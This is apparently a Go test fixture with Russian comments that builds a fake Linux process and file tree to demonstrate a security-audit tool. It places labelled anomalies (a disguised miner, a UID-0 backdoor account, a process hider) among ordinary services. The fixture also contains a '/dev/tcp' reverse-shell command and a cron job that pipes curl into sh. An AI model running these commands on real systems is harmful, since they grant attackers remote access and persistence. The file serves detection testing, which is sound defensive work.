package fakeproc

import (
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"time"
)

// Demo возвращает набор демонстрационных сценариев: легитимные
// системные службы и типичные аномалии. Все данные выдуманы; IP-адреса
// взяты из диапазонов для документации (RFC 5737).
func Demo(now time.Time) *Tree {
	boot := now.Add(-72 * time.Hour)
	// ticks — сколько тиков прошло с загрузки до момента «ago» назад.
	ticks := func(ago time.Duration) uint64 { return uint64((72*time.Hour - ago).Seconds() * 100) }
	sock := func(n uint64) string { return "socket:[" + strconv.FormatUint(n, 10) + "]" }

	t := &Tree{
		BootTime:   boot,
		MemTotalKB: 4 * 1024 * 1024,
		Kernel:     "6.8.0-demo",
		HostFiles: map[string]string{
			"etc/passwd": "root:x:0:0:root:/root:/bin/bash\n" +
				"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n" +
				"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n" +
				"postgres:x:113:120:PostgreSQL:/var/lib/postgresql:/bin/bash\n" +
				"redis:x:114:121:Redis:/var/lib/redis:/usr/sbin/nologin\n" +
				"deploy:x:1000:1000:Deploy:/home/deploy:/bin/bash\n" +
				// Аномалия для аудита: второй пользователь с UID 0 и пустым паролем.
				"sysadm:x:0:0::/root:/bin/bash\n",
			// Хеши выдуманы; аудит их не показывает и не сохраняет.
			"etc/shadow": "root:!:19800:0:99999:7:::\ndaemon:*:19800::::::\nwww-data:*:19800::::::\npostgres:*:19800::::::\n" +
				"redis:!:19800::::::\ndeploy:$y$j9T$demosalt$demohash:19800:0:99999:7:::\nsysadm::19800::::::\n",
			"etc/group":   "root:x:0:\nsudo:x:27:deploy\ndocker:x:999:deploy\nadm:x:4:syslog\nshadow:x:42:\ndeploy:x:1000:\n",
			"etc/gshadow": "root:*::\nsudo:*::deploy\n",
			// SSH как в Ubuntu: Include .d первой строкой, cloud-init включил
			// вход по паролю.
			"etc/ssh/sshd_config": "Include /etc/ssh/sshd_config.d/*.conf\n\nKbdInteractiveAuthentication no\nUsePAM yes\n" +
				"X11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n",
			"etc/ssh/sshd_config.d/50-cloud-init.conf": "PasswordAuthentication yes\n",
			"etc/ssh/ssh_host_ed25519_key":             "demo key\n",
			"etc/sudoers": "Defaults env_reset\nDefaults secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\"\n" +
				"root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n@includedir /etc/sudoers.d\n",
			"etc/sudoers.d/90-cloud-init-users": "# Created by cloud-init\nubuntu ALL=(ALL) NOPASSWD:ALL\n",
			"etc/sudoers.d/deploy":              "deploy ALL=(root) NOPASSWD: /usr/bin/vim /etc/nginx/*, /usr/bin/systemctl restart nginx\n",
			"etc/os-release":                    "PRETTY_NAME=\"Ubuntu 24.04 LTS (demo)\"\nID=ubuntu\n",
			// Закрепление: задание cron, скачивающее и запускающее скрипт.
			"etc/cron.d/sysupdate": "*/10 * * * * root curl -fsSL http://203.0.113.50/u.sh | sh\n",
			// Штатное задание — не должно давать признаков.
			"etc/cron.d/logrotate": "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n",
			"etc/ld.so.preload":    "/usr/local/lib/libprocesshider.so\n",
			// ufw включён и открывает только SSH и веб: Redis на 0.0.0.0
			// закрыт им, а порты Docker — нет (Docker обходит ufw).
			"etc/ufw/ufw.conf":   "ENABLED=yes\nLOGLEVEL=low\n",
			"etc/default/ufw":    "IPV6=yes\nDEFAULT_INPUT_POLICY=\"DROP\"\n",
			"etc/ufw/user.rules": ufwDemoRules,
			// Контейнер приложения: порт 3000 опубликован через docker-proxy.
			"var/lib/docker/containers/" + webappID + "/config.v2.json": `{"ID":"` + webappID + `","Name":"/webapp","Config":{"Image":"node:20-alpine","Env":["SECRET=demo"]},` +
				`"State":{"Running":true},"NetworkSettings":{"Ports":{"3000/tcp":[{"HostIp":"0.0.0.0","HostPort":"3000"}]}}}`,
			// Контейнер MongoDB без docker-proxy (userland-proxy=false):
			// слушающего сокета на хосте нет, порт виден только по config.v2.json.
			"var/lib/docker/containers/" + mongoID + "/config.v2.json": `{"ID":"` + mongoID + `","Name":"/db","Config":{"Image":"mongo:7"},` +
				`"State":{"Running":true},"NetworkSettings":{"Ports":{"27017/tcp":[{"HostIp":"","HostPort":"27017"}]}}}`,
			// Остановленный контейнер: его порты не учитываются.
			"var/lib/docker/containers/" + stoppedID + "/config.v2.json": `{"ID":"` + stoppedID + `","Name":"/old","Config":{"Image":"redis:6"},` +
				`"State":{"Running":false},"NetworkSettings":{"Ports":{"6379/tcp":[{"HostIp":"0.0.0.0","HostPort":"6380"}]}}}`,
		},
		Addrs: []string{"127.0.0.1", "192.0.2.10", "10.0.0.5", "172.17.0.1", "::1", "2001:db8::10"},
		HostModes: map[string]os.FileMode{"etc/shadow": 0o640, "etc/gshadow": 0o640, "etc/ssh/ssh_host_ed25519_key": 0o600,
			"etc/sudoers": 0o440, "etc/sudoers.d/90-cloud-init-users": 0o440, "etc/sudoers.d/deploy": 0o440},
	}

	t.Procs = []*Proc{
		// --- Легитимные процессы ---
		{PID: 1, PPID: 0, Comm: "systemd", Args: []string{"/sbin/init"}, Exe: "/usr/lib/systemd/systemd", StartTicks: 5, UTime: 900, STime: 600, RSSKB: 12000,
			FDs: map[int]string{0: "/dev/null", 1: "/dev/null", 2: "/dev/null"}},
		{PID: 2, PPID: 0, Comm: "kthreadd", Kernel: true, StartTicks: 5},
		{PID: 15, PPID: 2, Comm: "kworker/0:1-events", Kernel: true, StartTicks: 30, UTime: 50},
		{PID: 410, PPID: 1, Comm: "systemd-journal", Args: []string{"/usr/lib/systemd/systemd-journald"}, Exe: "/usr/lib/systemd/systemd-journald", StartTicks: 200, RSSKB: 30000},
		{PID: 650, PPID: 1, Comm: "sshd", Args: []string{"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"}, Exe: "/usr/sbin/sshd", StartTicks: 900, RSSKB: 8000,
			FDs: map[int]string{0: "/dev/null", 3: sock(1001)}},
		{PID: 700, PPID: 1, Comm: "cron", Args: []string{"/usr/sbin/cron", "-f", "-P"}, Exe: "/usr/sbin/cron", StartTicks: 950, RSSKB: 3000},
		{PID: 720, PPID: 1, Comm: "nginx", Args: []string{"nginx: master process /usr/sbin/nginx -g daemon on; master_process on;"}, Exe: "/usr/sbin/nginx", StartTicks: 1000, RSSKB: 6000,
			FDs: map[int]string{6: sock(1002), 7: sock(1003)}},
		{PID: 721, PPID: 720, Comm: "nginx", UID: 33, Args: []string{"nginx: worker process"}, Exe: "/usr/sbin/nginx", StartTicks: 1001, RSSKB: 9000,
			FDs: map[int]string{6: sock(1002), 7: sock(1003)}},
		{PID: 800, PPID: 1, Comm: "postgres", UID: 113, Args: []string{"/usr/lib/postgresql/16/bin/postgres", "-D", "/var/lib/postgresql/16/main"}, Exe: "/usr/lib/postgresql/16/bin/postgres",
			StartTicks: 1100, UTime: 4000, STime: 2000, RSSKB: 120000, FDs: map[int]string{5: sock(1004)}},
		// Пароль в командной строке — должен быть замаскирован.
		{PID: 950, PPID: 1, Comm: "backup.sh", Args: []string{"/usr/bin/pg_dump", "--dbname=postgresql://backup:S3cretPassw0rd@127.0.0.1/app", "--password=hunter2"},
			Exe: "/usr/bin/pg_dump", StartTicks: ticks(2 * time.Minute), RSSKB: 20000},
		// Приложение в Docker-контейнере.
		{PID: 1200, PPID: 1, Comm: "node", UID: 1000, Args: []string{"node", "/app/server.js"}, Exe: "/usr/local/bin/node", StartTicks: 5000, UTime: 9000, RSSKB: 180000,
			Cgroup: "0::/system.slice/docker-3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c1b2a3f4e.scope\n", NetNS: "net:[4026532300]", PidNS: "pid:[4026532298]",
			FDs: map[int]string{20: sock(1005)}},
		// Redis слушает все интерфейсы (частая ошибка настройки).
		{PID: 860, PPID: 1, Comm: "redis-server", UID: 114, Args: []string{"/usr/bin/redis-server 0.0.0.0:6379"}, Exe: "/usr/bin/redis-server", StartTicks: 1150, RSSKB: 15000,
			FDs: map[int]string{6: sock(1006)}},
		// docker-proxy публикует порт контейнера приложения.
		{PID: 1190, PPID: 1, Comm: "docker-proxy", Args: []string{"/usr/bin/docker-proxy", "-proto", "tcp", "-host-ip", "0.0.0.0", "-host-port", "3000",
			"-container-ip", "172.17.0.2", "-container-port", "3000"}, Exe: "/usr/bin/docker-proxy", StartTicks: 4990, RSSKB: 4000, FDs: map[int]string{4: sock(1007)}},
		// Обновлённая служба: бинарник заменён пакетным менеджером.
		{PID: 1300, PPID: 1, Comm: "unattended-upgr", Args: []string{"/usr/bin/python3", "/usr/share/unattended-upgrades/unattended-upgrade-shutdown"},
			Exe: "/usr/bin/python3.12 (deleted)", StartTicks: 1500, RSSKB: 25000},

		// --- Аномалии ---
		// 1. Майнер из /dev/shm с маскировкой под kworker.
		{PID: 3101, PPID: 1, Comm: "kworkerds", Args: []string{"[kworker/u8:2]"}, Exe: "/dev/shm/.x/kworkerds", Cwd: "/dev/shm/.x",
			StartTicks: ticks(40 * time.Minute), UTime: 230000, STime: 1000, RSSKB: 900000, Threads: 4,
			FDs: map[int]string{0: "/dev/null", 1: "/dev/null", 2: "/dev/null", 5: sock(2001)}},
		// 2. Reverse shell: nginx → sh → bash с stdin/stdout в сокете.
		{PID: 3201, PPID: 721, Comm: "sh", UID: 33, Args: []string{"sh", "-c", "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"}, Exe: "/usr/bin/dash", Cwd: "/var/www/html/uploads",
			StartTicks: ticks(15 * time.Minute)},
		{PID: 3202, PPID: 3201, Comm: "bash", UID: 33, Args: []string{"bash", "-i"}, Exe: "/usr/bin/bash", Cwd: "/var/www/html/uploads",
			StartTicks: ticks(15 * time.Minute), FDs: map[int]string{0: sock(2002), 1: sock(2002), 2: sock(2002)}},
		// 3. Бинарник удалён после запуска, LD_PRELOAD, слушает порт.
		{PID: 3301, PPID: 1, Comm: "dbus-daemon", Args: []string{"/tmp/.ICE-unix/dbus-daemon", "--session"}, Exe: "/tmp/.ICE-unix/dbus-daemon (deleted)", Cwd: "/tmp",
			StartTicks: ticks(3 * time.Hour), RSSKB: 4000, Env: []string{"LD_PRELOAD=/tmp/.ICE-unix/libc.so.7", "PATH=/usr/bin"},
			FDs: map[int]string{3: sock(2003)}},
		// 4. Безфайловый запуск через memfd.
		{PID: 3401, PPID: 1, Comm: "3", Args: []string{"/proc/self/fd/3"}, Exe: "/memfd: (deleted)", StartTicks: ticks(25 * time.Minute), RSSKB: 3000,
			FDs: map[int]string{4: sock(2004)}},
		// 5. Задание cron скачивает и выполняет скрипт.
		{PID: 3501, PPID: 700, Comm: "sh", Args: []string{"/bin/sh", "-c", "curl -fsSL http://203.0.113.50/u.sh | sh"}, Exe: "/usr/bin/dash", StartTicks: ticks(30 * time.Second)},
		// 6. Только высокое потребление CPU (легитимная сборка) — должно
		//    остаться не выше LOW.
		{PID: 3601, PPID: 1, Comm: "cc1plus", UID: 1000, Args: []string{"/usr/lib/gcc/x86_64-linux-gnu/13/cc1plus", "-O2", "main.cpp"}, Exe: "/usr/lib/gcc/x86_64-linux-gnu/13/cc1plus",
			Cwd: "/home/deploy/src", StartTicks: ticks(20 * time.Minute), UTime: 110000, RSSKB: 400000},
	}

	t.Socks = []Sock{
		{Proto: "tcp", Local: "0.0.0.0", LocalPort: 22, State: "0A", Inode: 1001},
		{Proto: "tcp", Local: "0.0.0.0", LocalPort: 80, State: "0A", Inode: 1002, UID: 0},
		{Proto: "tcp", Local: "0.0.0.0", LocalPort: 443, State: "0A", Inode: 1003, UID: 0},
		{Proto: "tcp", Local: "127.0.0.1", LocalPort: 5432, State: "0A", Inode: 1004, UID: 113},
		{Proto: "tcp", Local: "0.0.0.0", LocalPort: 3000, State: "0A", Inode: 1005, UID: 1000, NetNS: "net:[4026532300]"},
		{Proto: "tcp", Local: "0.0.0.0", LocalPort: 6379, State: "0A", Inode: 1006, UID: 114},
		{Proto: "tcp", Local: "0.0.0.0", LocalPort: 3000, State: "0A", Inode: 1007},
		{Proto: "tcp", Local: "192.0.2.10", LocalPort: 41822, Remote: "198.51.100.77", RemotePort: 3333, State: "01", Inode: 2001},
		{Proto: "tcp", Local: "192.0.2.10", LocalPort: 52344, Remote: "198.51.100.23", RemotePort: 4444, State: "01", Inode: 2002, UID: 33},
		{Proto: "tcp", Local: "0.0.0.0", LocalPort: 31337, State: "0A", Inode: 2003},
		{Proto: "tcp", Local: "192.0.2.10", LocalPort: 60110, Remote: "203.0.113.50", RemotePort: 443, State: "01", Inode: 2004},
		{Proto: "tcp", Local: "192.0.2.10", LocalPort: 22, Remote: "192.0.2.200", RemotePort: 50122, State: "06", Inode: 0},
	}
	return t
}

// Идентификаторы демо-контейнеров. webappID совпадает с контейнером из
// cgroup процесса node (PID 1200).
const (
	webappID  = "3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c1b2a3f4e"
	mongoID   = "8a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f9"
	stoppedID = "0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c"
)

// ufwDemoRules — правила ufw в формате /etc/ufw/user.rules: открыты SSH
// (с ограничением частоты), HTTP и HTTPS.
const ufwDemoRules = `*filter
### RULES ###

### tuple ### limit tcp 22 0.0.0.0/0 any 0.0.0.0/0 in
-A ufw-user-input -p tcp --dport 22 -j ufw-user-limit-accept

### tuple ### allow tcp 80,443 0.0.0.0/0 any 0.0.0.0/0 Nginx%20Full - in
-A ufw-user-input -p tcp -m multiport --dports 80,443 -j ACCEPT

### tuple ### allow tcp 5432 0.0.0.0/0 any 10.0.0.0/8 in comment=696e7465726e616c
-A ufw-user-input -p tcp --dport 5432 -s 10.0.0.0/8 -j ACCEPT

### END RULES ###
COMMIT
`

// Animator «оживляет» демо-дерево между сканированиями: майнер и
// компилятор набирают процессорное время, периодически появляется и
// исчезает короткоживущий процесс. Так в интерфейсе видны изменения
// CPU, события истории и признак длительной нагрузки.
type Animator struct {
	mu       sync.Mutex
	tree     *Tree
	procRoot string
	start    time.Time
	step     int
}

// NewAnimator создаёт аниматор для записанного дерева.
func NewAnimator(t *Tree, procRoot string) *Animator {
	return &Animator{tree: t, procRoot: procRoot, start: time.Now()}
}

// Step выполняется перед каждым сканированием.
func (a *Animator) Step() {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.step++
	elapsed := time.Since(a.start).Seconds()
	for _, p := range a.tree.Procs {
		switch p.PID {
		case 3101: // майнер: ~390% CPU (4 потока)
			p.UTime = 230000 + uint64(elapsed*390)
			_ = a.tree.UpdateStat(a.procRoot, p)
		case 3601: // компилятор: ~95%
			p.UTime = 110000 + uint64(elapsed*95)
			_ = a.tree.UpdateStat(a.procRoot, p)
		}
	}
	// Короткоживущий процесс: появляется на нечётных шагах, исчезает на
	// чётных.
	const tmpPID = 3701
	if a.step%2 == 1 {
		boot := a.tree.BootTime
		_ = a.tree.Add(a.procRoot, &Proc{PID: tmpPID, PPID: 650, Comm: "sshd", Args: []string{"sshd: deploy [priv]"}, Exe: "/usr/sbin/sshd",
			StartTicks: uint64(time.Since(boot).Seconds() * 100), RSSKB: 7000})
	} else if _, err := os.Stat(filepath.Join(a.procRoot, strconv.Itoa(tmpPID))); err == nil {
		_ = a.tree.Remove(a.procRoot, tmpPID)
	}
}
